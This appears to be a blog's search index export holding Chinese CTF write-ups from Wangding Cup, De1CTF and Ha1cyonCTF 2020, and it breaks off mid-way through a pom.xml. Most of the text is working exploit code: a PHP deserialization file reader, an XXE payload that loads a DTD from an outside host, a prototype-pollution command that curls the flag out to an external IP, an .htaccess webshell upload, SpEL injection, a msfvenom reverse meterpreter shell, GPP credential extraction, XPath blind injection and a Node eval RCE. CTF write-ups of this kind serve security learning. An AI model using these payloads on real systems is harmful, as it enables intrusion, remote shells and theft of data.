<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网鼎杯2020青龙组部分writeup</title>
      <link href="/2020/05/10/wang-ding-bei-2020-qing-long-zu-writeup/"/>
      <url>/2020/05/10/wang-ding-bei-2020-qing-long-zu-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Web-AreUSerialz-solve"><a href="#Web-AreUSerialz-solve" class="headerlink" title="Web AreUSerialz|solve"></a>Web AreUSerialz|solve</h2><p>不能用%00</p><p>用public绕过</p><p>然后/etc/passwd ,2.0 read绕过文件读取</p><p>爆破配置文件(以前做一道题的一个sb想法现在用上了)</p><pre><code>package mainimport (    "fmt"    "github.com/levigross/grequests"    "io/ioutil"    "path"    "strconv"    "strings")func main(){    a,_:=ioutil.ReadFile("/root/document/myown/linux_配置文件_服务器端.txt")    aa:=string(a)    b:=strings.Split(aa,"\n")    for i:=0;i&lt;len(b) ;i++  {        str:=`O:11:"FileHandler":3:{s:2:"op";s:3:"2.0";s:8:"filename";s:%s:"%s";s:7:"content";N;}`        str2:=fmt.Sprintf(str,strconv.Itoa(len(b[i])),b[i])        fmt.Println(b[i])        req,_:=grequests.Get("url",&amp;grequests.RequestOptions{            Params: map[string]string{"str":str2},        })        fmt.Println(req.StatusCode)        z:=req.DownloadToFile("/tmp/in/"+strings.ReplaceAll(b[i],"/","_")+"_"+path.Base(b[i]))        fmt.Println(z)    }}</code></pre><p>查看配置看到 <code>/etc/apache2/httpd.conf</code>的网站目录是 <code>/web/html/</code></p><p>所以</p><p>读取<code>/web/html/flag.php</code>，这个write弄来干啥</p><pre><code>&lt;?phpclass FileHandler {    public $op;    public $filename;    public $content;    public function __construct(){        $this-&gt;op="2.0";        $this-&gt;filename="/web/html/flag.php";    }}$a=new FileHandler();$b=serialize($a);echo $b."\n";echo strlen($b)."\n";echo urlencode($b);</code></pre><p><img src="../../../../../../../images/wangding2020/1.png" alt=""></p><h2 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h2><p><code>&lt;!-- flag in /flag --&gt;</code></p><p>有一个任意文件读取</p><p><code>/file_in_java/DownloadServlet?filename=../../../../../../../../../../../../etc/passwd HTTP/1.1</code></p><p>爬<code>web.xml</code></p><p><code>GET /file_in_java/DownloadServlet?filename=./../../../web.xml HTTP/1.1</code></p><p>然后通过 web.xml 查看 java 的class 位置，爬java代码</p><pre><code>file_in_java/DownloadServlet?filename=./../../../classes/cn/abc/servlet/UploadServlet.class DownloadServlet?filename=./../../../classes/cn/abc/servlet/ListFileServlet.class DownloadServlet?filename=./../../../classes/cn/abc/servlet/DownloadServlet.class </code></pre><p>代码看到：</p><pre><code>if (filename.startsWith("excel-") &amp;&amp; "xlsx".equals(fileExtName)) {try {Workbook wb1 = WorkbookFactory.create(in);Sheet sheet = wb1.getSheetAt(0);System.out.println(sheet.getFirstRowNum());</code></pre><p>看代码应该就是一个 CVE-2014-3529 这个  <a href="https://xz.aliyun.com/t/6996#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/6996#toc-2</a>代码都一样</p><p>弄一个excel</p><p><a href="https://github.com/apache/poi/raw/f509d1deae86866ed531f10f2eba7db17e098473/test-data/spreadsheet/CustomXMLMappings.xlsx" target="_blank" rel="noopener">https://github.com/apache/poi/raw/f509d1deae86866ed531f10f2eba7db17e098473/test-data/spreadsheet/CustomXMLMappings.xlsx</a></p><p>然后在CONTENT_TYPE.xml 插入XXE代码</p><pre><code>&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://47.92.84.174/xxe/evil.dtd"&gt;%remote;]&gt;&lt;x&gt;&lt;/x&gt;</code></pre><p>然后因为一定一定要 excel- 开头  xlsx 结尾才能进入if触发这个漏洞,改个名字excel-123.xlsx</p><p>然后 服务器上 nc -vlp 8000</p><p>上传这个 excel-开头的xlsx 文件就可以触发xxe了， 在vps读flag</p><p><img src="../../../../../../../images/wangding2020/2.png" alt=""></p><h2 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h2><p>有个原型链污染</p><p><a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=undefsafe" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=undefsafe</a></p><pre><code>var a = require("undefsafe");var payload = "__proto__.toString";a({},payload,"JHU");console.log({}.toString);</code></pre><p>这样用</p><p>用了  undefsafe 的就是在</p><pre><code>get_note(id) {    var r = {}    undefsafe(r, id, undefsafe(this.note_list, id));    return r;}edit_note(id, author, raw) {    undefsafe(this.note_list, id + '.author', author);    undefsafe(this.note_list, id + '.raw_note', raw);}</code></pre><p>这两个地方</p><p>然后status有一个 命令执行的，</p><pre><code>for (let index in commands) {    exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) =&gt; {</code></pre><p>用原型链污染来命令执行</p><p>本地测试，这个raw也写入了 commands 的key值</p><pre><code>a={}a.__proto__.raw="ls";let commands = {    "script-1": "uptime",    "script-2": "free -m"};for (let index in commands) {    console.log(commands[index])}uptimefree -mls</code></pre><p>所以就可以写入命令</p><p>exp</p><p>nc -vlp 9999</p><pre><code>url='http://133232ff2b4b4427b263d62048aef2ec75a91231d810442c.cloudgame1.ichunqiu.com:8080/'js={'author': '1123q','raw': 'curl http://47.71.14.162:9999/`cat /flag|base64` ', 'id': '__proto__'}req=requests.post(url+"edit_note",json=js)print(req.text)req=requests.get(url+"status")print(req.text)</code></pre><p><img src="../../../../../../../images/wangding2020/3.png" alt=""></p><p><img src="../../../../../../../images/wangding2020/4.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF2020-部分writeup</title>
      <link href="/2020/05/04/de1ctf2020-bu-fen-writeup/"/>
      <url>/2020/05/04/de1ctf2020-bu-fen-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h2><p>web签到题，很友好，是考烂了的知识点</p><p>上传<code>.htaccess</code>,然后就是简单的换行绕过</p><pre><code>import requestsurl='http://129.204.21.115/index.php'file='''#define width 1337#define height 1337AddType application/x-httpd-p\\hp .wuwup\\hp_value a\\uto_append_file "p\\hp://filter/convert.bas\\e64-decode/resource=shell.wuwu"'''.replace('\r\n','\n')print(file)data={'upload':'submit'}files = {'fileUpload': ('.htaccess', file, 'image/png')}req=requests.post(url=url,files=files,data=data)print(req.text)file='''#define width 1337\n#define height 1337PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4='''#PD9waHAgcGhwaW5mbygpOz8+file='''#define width 1337\n#define height 13371PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4='''data={'upload':'submit'}files = {'fileUpload': ('shell.wuwu', file, 'image/png')}req=requests.post(url=url,files=files,data=data)print(req.text)</code></pre><p>然后去页面post cmd执行命令</p><p>flag:</p><pre><code>De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}</code></pre><p>后来出题人说了这个是非预期，醉了，估计国内师傅基本是非预期做的，预期是用cgi执行命令</p><p>据说外国师傅们用预期做的要骂人</p><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>目标是读取 <code>/flag</code></p><p>这个执行计算看到<code>/spel/calc?calc=1-1</code>，简直是明示了，<code>spel</code>表达式注入</p><p>经过测试ban了一些东西</p><pre><code>newT(instanceofgetClasslangRuntime# </code></pre><p><code>Runtime</code>和<code>lang</code>这个类型的还可以通过字符串拼接绕过，但是最关键的是<code>T(</code>没了，代表着无法实例化</p><p>所以结合目标读取<code>/flag</code>，就是寻找一个静态调用的方法来读取文件</p><p>本地测试，最终找到了</p><p><code>System.out.println((java.nio.file.Files.readAllLines(java.nio.file.Paths.get("/etc/passwd"))));</code></p><p>这个样子的</p><p>有一个终极大坑</p><p>开始用的是</p><p><code>System.out.println((java.nio.file.Files.readAllBytes(java.nio.file.Paths.get("/etc/passwd"))));</code></p><p>得到结果<code>[B@1540e19d</code>，一开始想错了，以为这个是异步，就去找静态的获取异步</p><p>后来没找到，突然发现<code>new String()</code>能获取这个的值才发现是<code>readAllBytes</code>是写入内存的，就这都卡了一个小时</p><p>所以直接换成<code>readAllLines</code></p><p>脚本</p><pre><code>import requestsimport urllibsession = requests.session()burp0_url = "http://106.52.164.141:80/spel/calc"payload="''['class'].forName('java.la'+'ng'+'.Runti'+'me').getDeclaredMethods()[15]"payload="T%28java.lang.Runtime)".replace('a','%61').replace('i','%69')payload="hasAuthority('/flag')"#payload="hasRole()"payload="{{'a'}}.stream()"payload="''.class.forName('java.'+'lang.'+'Runtim'+'e').getMethod()"payload="''.class.forName('java.io.File').listRoots()"payload="''.class.forName('java.nio.file.Files').readAllLines(''.class.forName('java.nio.file.Paths').get('/flag'))"print(payload)param={'calc':payload}req=session.get(burp0_url,params=param)print(req.text)</code></pre><p>flag</p><p>De1CTF{NobodyKnowsMoreThanTrumpAboutJava}</p><h2 id="Hard-pentest1"><a href="#Hard-pentest1" class="headerlink" title="Hard_pentest1"></a>Hard_pentest1</h2><p>第一层</p><p>主要是绕过</p><pre><code>!preg_match('/[a-z0-9;~^`&amp;|]/is',$file_content)和php后缀</code></pre><p>随便上传一个文件，看到<code>IIS8.5</code>，用<code>::$DATA</code>绕过后缀</p><p>然后正则</p><pre><code>&lt;?=$_=!!"_".""?&gt;  //1&lt;?=$__=!!"".""?&gt; //false&lt;?=@$___=$_/$__?&gt; // 得到INF</code></pre><p>得到字符串后面就简单了，只要截取再用php自增就可以了</p><pre><code>import requestsurl='http://47.113.219.76/index.php'import refile='''&lt;?=$_=!!"_".""?&gt;&lt;?=$__=!!"".""?&gt;&lt;?=@$___=$_/$__?&gt;&lt;?=$____="".$___.""?&gt;&lt;?=$____=$____{$_}?&gt;&lt;?=$_____=++$____?&gt; &lt;?=$______=++$_____?&gt; &lt;?=$_______=++$_____?&gt; &lt;?=$_______=++$_______?&gt; &lt;?=$________=++$_______?&gt;  &lt;?=$_________=++$________?&gt;&lt;?=$_='_'.$______.$____.$_______.$_________?&gt;&lt;?=$$_[_]($$_[__])?&gt;'''print(file)data={'submit':'submit'}files = {'file': ('1.php::$DATA', file, 'application/octet-stream')}req=requests.post(url=url,files=files,data=data)print(req.content)st=re.findall('in:(uploads.*\s)',req.text)print()print(st[0].strip())</code></pre><p>然后是windows的域渗透</p><p>先弹个meterpreter的shell</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp  lhost=mu27062382.zicp.vip lport=23561 -a x86 --platform win -f exe -o /tmp/v.exeuse exploit/multi/handler set payload  windows/meterpreter/reverse_tcpset lport 4444set lhost mu27062382.zicp.viprunexecute  -H -i -f cmd.exe</code></pre><p>上传<code>nbtscan-1.0.35.exe</code>扫描</p><pre><code>nbtscan-1.0.35.exe -m 192.168.0.0/24192.168.0.11    DE1CTF2020\DM                   00:16:3e:03:68:c5 SHARING192.168.0.12    DE1CTF2020\DC                   00:16:3e:03:1a:de SHARING</code></pre><p>后面timeout了， 可能工具有问题</p><p>后来想上传个<code>nmap</code>来使用nmap脚本，结果太大了上传失败，只好继续用msf</p><p>net命令在原本目录没有，需要到<code>C:\Windows\System32&gt;</code></p><p>然后</p><p><a href="https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/</a></p><p>认真看了这篇文章，再看了下命令</p><pre><code>C:\Windows\system32&gt;net view \\192.168.0.12net view \\192.168.0.12Shared resources at \\192.168.0.12Share name  Type  Used as  Comment              -------------------------------------------------------------------------------Hint        Disk                                NETLOGON    Disk           Logon server share   SYSVOL      Disk           Logon server share   The command completed successfully.</code></pre><p>然后<code>net use q: \\ip</code> 来映射到本机的<code>q:</code>盘</p><pre><code>net use q: \\192.168.0.12\Hintnet use r: \\192.168.0.12\NETLOGONnet use s: \\192.168.0.12\SYSVOL </code></pre><p><img src="../../../../../../../images/De1CTF2020/show-mount.png" alt=""></p><p>然后exit会meterpreter的shell</p><p>到<code>q:</code>看看</p><p><img src="../../../../../../../images/De1CTF2020/q-pan.png" alt=""></p><p>下载下来</p><p>再去<code>s:</code>看看</p><p><img src="../../../../../../../images/De1CTF2020/s-pan.png" alt=""></p><p>然后后来在执行<code>net user /domain</code>的时候看到了</p><pre><code>C:\Windows\System32&gt;net user /domainnet user /domainThe request will be processed at a domain controller for domain De1CTF2020.lab.User accounts for \\dc.De1CTF2020.lab-------------------------------------------------------------------------------Administrator            De1ta                    Guest                    HintZip_Pass             krbtgt                   web                      The command completed successfully.</code></pre><p>zip的密码应该就是<code>HintZip_Pass</code>用户的密码</p><p>然后继续看文章</p><p>看到<code>组策略首选项</code>，一开始完美错过了，后来注意到<code>SYSVOL</code>才锁定这里,</p><h3 id="组策略首选项"><a href="#组策略首选项" class="headerlink" title="组策略首选项"></a>组策略首选项</h3><p><strong>GPP的全名是组策略首选项，是为了满足管理活动目录的需要存在的，GPP的操作对象是组策略对象（GPO），在所有计算机上更新密码或者指定新的管理员，就会使用这个机制更新。GPP发布的账号信息全部存储在\[Domain Controller]\SYSVOL[Ddomain]\Policies中。可以在该文件夹找到一个名为Groups.xml的文件。若能找到该文件，就可以在Groups.xml文件找到cpassword的哈希值。然后使用gpprefdecrypt.py解密GPP中本地管理员账户的密码，或者使用msf中的post/windows/gather/credentials/gpp获取本地管理员账号。</strong></p><p>用msf的后渗透模块也可以</p><p>设置好配置domains是De1CTF2020</p><p><img src="../../../../../../../images/De1CTF2020/gpp.png" alt=""></p><p>得到密码<code>zL1PpP@sSwO3d</code></p><p>去打开zip</p><p>zip在linux解不开，去window解</p><p>打开flag和hint</p><p>flag</p><p>De1CTF{GpP_11Is_SoOOO_Ea3333y}</p><p><a href="https://www.andreafortuna.org/2019/02/13/abusing-group-policy-preference-files-for-password-discovery/" target="_blank" rel="noopener">https://www.andreafortuna.org/2019/02/13/abusing-group-policy-preference-files-for-password-discovery/</a></p><p><a href="https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/</a></p><p><a href="https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/" target="_blank" rel="noopener">https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/</a></p><p><a href="https://www.c0bra.xyz/2020/03/05/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%BB%84%E7%AD%96%E7%95%A5%E6%9C%89%E5%85%B3%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://www.c0bra.xyz/2020/03/05/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%BB%84%E7%AD%96%E7%95%A5%E6%9C%89%E5%85%B3%E5%AD%A6%E4%B9%A0/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ha1cyonCTF2020-部分writeup.md</title>
      <link href="/2020/04/21/ha1cyon-ctf2020-writeup/"/>
      <url>/2020/04/21/ha1cyon-ctf2020-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>真签到题</p><p>直接抓包看到</p><p><img src="../../../../../../../images/ha1cyon/50.png" alt=""></p><h2 id="超简单的PHP！！！超简单！！！"><a href="#超简单的PHP！！！超简单！！！" class="headerlink" title="超简单的PHP！！！超简单！！！"></a>超简单的PHP！！！超简单！！！</h2><p>主要代码：</p><pre><code>header('content-type:application/json');session_start();function safe($msg){    if (strlen($msg)&gt;17){        return "msg is too loooong!";    } else {        return preg_replace("/php/","?",$msg);    }}if (!isset($_SESSION['msg'])&amp;empty($_SESSION['msg']))$_SESSION['msg'] = array();if (isset($_POST['msg'])){    array_push($_SESSION['msg'], ['msg'=&gt;safe($_POST['msg']),'time'=&gt;date('Y-m-d H:i:s',time())]);    echo json_encode(array(['msg'=&gt;safe($_POST['msg']),'time'=&gt;date('Y-m-d H:i:s',time())]));    exit();}if(!empty($_SESSION['msg'])){    echo json_encode($_SESSION['msg']);} else {echo "è¿ä¸å¿«å»çè¨ï¼";}</code></pre><p>可以看到可以修改session，然后有一个<code>phpinfo.php</code>文件</p><p>看一下,看到<code>session.save_path</code>是空，也就是默认<code>/tmp</code></p><p>有一个小限制</p><pre><code>if (strlen($msg)&gt;17){        return "msg is too loooong!";    } else {        return preg_replace("/php/","?",$msg);    }</code></pre><p>不能用php，但是没有用<code>i</code>修饰符，就<code>PhP</code>绕过</p><p>后面还有一个time的语句，</p><p>就可以用换行<code>\n</code>和<code>#</code>注释来多次改session来写session文件</p><p>脚本</p><pre><code>import requestssession = requests.session()burp0_url = "http://ha1cyon-ctf.fun:30135/msg.php"burp0_cookies = {"session": "acc48197-782d-41d9-a631-2a3e81837e9a.s_KiQgbftrE7e0hu6hLPXKF0W3I", "PHPSESSID": "4feut4nk0o5o37jjsg8173opk3"}burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://ha1cyon-ctf.fun:30135/index.bak.php?action=message.php", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Connection": "close"}burp0_data = {"msg": "&lt;?PhP \n#"}session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)burp0_data = {"msg": "\neval($_GET[_]);#"}session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)burp0_data = {"msg": "\n ?&gt;"}session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)burp0_url = "http://ha1cyon-ctf.fun:30135/index.bak.php?action=/tmp/sess_4feut4nk0o5o37jjsg8173opk3&amp;_=print_r(scandir('/'));print_r(file_get_contents('/FIag_!S_it'));"r=session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)print(r.text)</code></pre><p><img src="../../../../../../../images/ha1cyon/chao-jiandan-php.png" alt=""></p><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p>登录抓包看看，是xml请求，第一反应就是XXE，</p><p>全部XXE打上去了并没有用，并不是XXE，</p><p>而是XPATH盲注</p><p><a href="https://www.cnblogs.com/backlion/p/8554749.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/8554749.html</a></p><p>脚本</p><pre><code>import requestsimport reurl='http://ha1cyon-ctf.fun:30163/'sess=requests.session()def token():    req=sess.get(url)    tok=re.findall('&lt;input type="hidden" id="token" value="(.*)" /&gt;',req.text)    return tok[0]def login(username,password):    data='''&lt;username&gt;{}&lt;/username&gt;&lt;password&gt;{}&lt;/password&gt;&lt;token&gt;{}&lt;/token&gt;'''.format(username,password,token())    req=sess.post(url+'login.php',data=data,headers = {'Content-Type': 'application/xml'})    print(req.text,req.status_code)    return req# rootpayload="' or  substring(name(/*[position()=1]),{},1)='{}'  or '1' = '1"ro='root'payload="' or substring(name(/root/*[position()=1]),{},1)='{}'  or '1' = '1"ro='accounts'payload="' or substring(name(/root/accounts/*[position()=1]),{},1)='{}'  or '1' = '1"ro='user'payload="' or substring(name(/root/accounts/user/*[position()=2]),{},1)='{}'  or '1' = '1"# id username passwordro=''payload="1' or substring(/root/accounts/user[id=2]/username,{},1)='{}' or '1'='1"# guest adm1nro=''payload="1' or substring(/root/accounts/user[id=2]/password,{},1)='{}' or '1'='1"#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123ro=''import stringfor i in range(1,100):    for j in string.digits+string.ascii_letters+'*':        if j=='*':            print('***************false')            break        tmp=payload.format(i,j)        req=login(tmp,'ad')        if '非法操作' in req.text:            ro+=j            print(ro)            break</code></pre><p>注入得到：</p><p><code>adm1n cf7414b5bdb2e65ee43083f4ddbc4d9f</code></p><p>密码md5 解一下就是<code>gtfly123</code></p><p>然后有一个文件包含，不能直接包含flag，显示有危险字符</p><p>又是用php://了</p><p>大概过滤了</p><pre><code>phpreadbase64</code></pre><p>简单大小写绕过</p><p><code>/admin.php?file=PhP://filter/Read=convert.basE64-encode/resource=/flag</code></p><p><img src="../../../../../../../images/ha1cyon/ezlogin.png" alt=""></p><p>flag</p><p>flag{95f4aaf6-ae61-47a6-affa-6d2811efbe0e}</p><h2 id="验证🐎"><a href="#验证🐎" class="headerlink" title="验证🐎"></a>验证🐎</h2><p>代码</p><pre><code>const express = require('express');const bodyParser = require('body-parser');const cookieSession = require('cookie-session');const fs = require('fs');const crypto = require('crypto');const keys = require('./key.js').keys;function md5(s) {  return crypto.createHash('md5')    .update(s)    .digest('hex');}function saferEval(str) {  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {    return null;  }  return eval(str);} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个const template = fs.readFileSync('./index.html').toString();function render(results) {  return template.replace('{{results}}', results.join('&lt;br/&gt;'));}const app = express();app.use(bodyParser.urlencoded({ extended: false }));app.use(bodyParser.json());app.use(cookieSession({  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧  keys}));Object.freeze(Object);Object.freeze(Math);app.post('/', function (req, res) {  let result = '';  const results = req.session.results || [];  const { e, first, second } = req.body;  if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) {    if (req.body.e) {      try {        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';      } catch (e) {        console.log(e);        result = 'Wrong Wrong Wrong!!!';      }      results.unshift(`${req.body.e}=${result}`);    }  } else {    results.unshift('Not verified!');  }  if (results.length &gt; 13) {    results.pop();  }  req.session.results = results;  res.send(render(req.session.results));});// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get('/source', function (req, res) {  res.set('Content-Type', 'text/javascript;charset=utf-8');  res.send(fs.readFileSync('./index.js'));});app.get('/', function (req, res) {  res.set('Content-Type', 'text/html;charset=utf-8');  req.session.admin = req.session.admin || 0;  res.send(render(req.session.results = req.session.results || []))});app.listen(80, '0.0.0.0', () =&gt; {  console.log('Start listening')});</code></pre><p>第一步是需要<code>if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) {</code></p><p>可以看到用了<code>app.use(bodyParser.json());</code></p><p>就是可以用json来绕过，</p><p>弄一个这个</p><pre><code>"first":{"length":"1"},"second":{"length":"1"}</code></pre><p>就可以绕过了，first和second现在都是object</p><p>而first.length===second.length, 而且</p><p>first!==second</p><p>最关键是</p><p><code>md5(first+keys[0]) === md5(second+keys[0])</code></p><p>这个代码，<code>first</code>是一个对象，和<code>keys[0]</code>拼接的时候就转换成String</p><p>而first的字符串和second的字符串相等，全部满足了</p><p>然后就是用Math来RCE了，利用函数嵌套的样子来</p><p>传入 Math+1 这个是字符形式</p><p>这个就是一个题目改编的了</p><p>脚本：</p><pre><code>import reencode = lambda code: list(map(ord,code))decode = lambda code: "".join(map(chr,code))a=f"""(m0=&gt;(        m0=m0.constructor,        m0.x=m0.constructor(            m0.fromCharCode({encode("return process.mainModule.require('child_process').execSync('cat /flag')")})        )()    ))(Math+1)"""a=re.sub(r"[\s\[\]]", "", a).replace("m0","Math")print(a)</code></pre><pre><code>POST / HTTP/1.1Host: ha1cyon-ctf.fun:30300User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://ha1cyon-ctf.fun:30300/Content-Type: application/jsonContent-Length: 402Connection: closeCookie: session=acc48197-782d-41d9-a631-2a3e81837e9a.s_KiQgbftrE7e0hu6hLPXKF0W3I; PHPSESSID=4feut4nk0o5o37jjsg8173opk3; PHPSESSION=eyJhZG1pbiI6MCwicmVzdWx0cyI6W119; PHPSESSION.sig=Af7dna727rpLpx--lZVqoWD5BKUUpgrade-Insecure-Requests: 1{"e":"(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)","first":{"length":"1"},"second":{"length":"1"}}</code></pre><p><img src="../../../../../../../images/ha1cyon/yan-zheng-ma.png" alt=""></p><p>flag:</p><p>flag{8d82d5d6-741e-432a-be35-e43c23180b1a}</p><h2 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h2><p>就是一个简单反序列化，flag在phpinfo里面</p><pre><code>&lt;?phpclass HelloPhp{    public $a;    public $b;}$a=new HelloPhp();$a-&gt;b='call_user_func';$a-&gt;a='phpinfo';echo urlencode(serialize($a));?&gt;</code></pre><p><code>http://ha1cyon-ctf.fun:30089/time.php?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A1%3A%22b%22%3Bs%3A14%3A%22call_user_func%22%3B%7D</code></p><p><img src="../../../../../../../images/ha1cyon/real-ez.png" alt=""></p><p>FLAG</p><p>flag{7b0e7129-48fa-44b7-a8d8-8e1ed7d4a21e} </p><h2 id="ezshiro"><a href="#ezshiro" class="headerlink" title="ezshiro"></a>ezshiro</h2><p>看到访问 <code>/json</code> 就跳到<code>/login</code>，</p><p>是一个比较新的<code>shiro</code>漏洞<code>CVE-2020-1957</code></p><p>可以通过<code>/;/json</code>的方式绕过直接访问</p><p><code>GET</code>访问是显示<code>Request method not support</code></p><p><code>POST a=1</code>访问，</p><p>看到<code>Unrecognized token  was expecting (&amp;#39;true&amp;#39;, &amp;#39;false&amp;#39; or &amp;#39;null&amp;#39;)</code></p><p>所以直接POST true，看到<code>jackson interface</code>， 所以是<code>jackson</code>反序列化</p><p>看一下<code>pom.xml</code>有什么</p><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;  &lt;parent&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;    &lt;version&gt;1.5.22.RELEASE&lt;/version&gt;    &lt;relativePath/&gt;  &lt;/parent&gt;  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;  &lt;artifactId&gt;shiro-test&lt;/artifactId&gt;  &lt;build&gt;    &lt;plugins&gt;      &lt;plugin&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;        &lt;configuration&gt;          &lt;fork&gt;true&lt;/fork&gt;          &lt;mainClass&gt;com.lfy.ctf.Application&lt;/mainClass&gt;        &lt;/configuration&gt;        &lt;executions&gt;          &lt;execution&gt;            &lt;goals&gt;              &lt;goal&gt;repackage&lt;/goal&gt;            &lt;/goals&gt;          &lt;/execution&gt;        &lt;/executions&gt;      &lt;/plugin&gt;    &lt;/plugins&gt;  &lt;/build&gt;  &lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;      &lt;version&gt;1.5.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;      